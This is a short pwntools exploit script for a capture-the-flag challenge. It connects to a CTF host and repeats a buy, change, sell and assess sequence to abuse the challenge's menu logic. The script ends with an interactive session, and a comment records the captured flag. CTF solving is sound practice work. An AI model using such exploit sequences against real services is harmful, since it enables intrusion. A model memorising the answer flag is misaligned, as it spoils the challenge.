from pwn import *

# context.arch = 'amd64'
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./algo', '''
#     b *(menu+185)
#     b *(menu+200)
#     b *(menu+215)
#     b *(menu+230)
#     continue
# ''')

p = remote('challenge.ctf.games', 30241)

def buy(quality):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(quality).encode())

def sell():
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', b'y')

def change(idx, quality):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', str(quality).encode())

def assess():
    p.sendlineafter(b'> ', b'4')

buy(4)
change(0, 5)
sell()
buy(1)
assess()
assess()
sell()

for i in range(22):
    buy(5)
    change(0, 5)
    sell()
    buy(1)
    assess()
    assess()
    sell()

assess()

p.interactive()

# flag{9f8cc00f4d57d34fe1a8248194e7aa27}